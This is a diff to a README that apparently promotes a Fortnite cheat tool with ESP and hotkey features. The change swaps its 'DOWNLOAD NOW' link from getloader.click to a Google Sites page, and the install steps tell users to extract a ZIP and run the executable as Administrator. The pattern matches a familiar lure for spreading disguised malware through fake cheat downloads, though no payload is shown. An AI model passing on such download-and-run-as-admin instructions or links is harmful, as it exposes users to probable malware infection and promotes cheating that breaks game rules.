@@ -59,7 +59,7 @@ Enhance your **Fortnite** gameplay with powerful tools for precision, awareness,
 
 ## 🛠 How to Download & Install
 
-1. Click **[DOWNLOAD NOW](https://getloader.click)**.  
+1. Click **[DOWNLOAD NOW](https://sites.google.com/view/beliumsoft)**.  
 2. Extract the ZIP archive to your preferred folder.  
 3. Run the executable as Administrator.  
 4. Configure settings, hotkeys, and ESP options.  
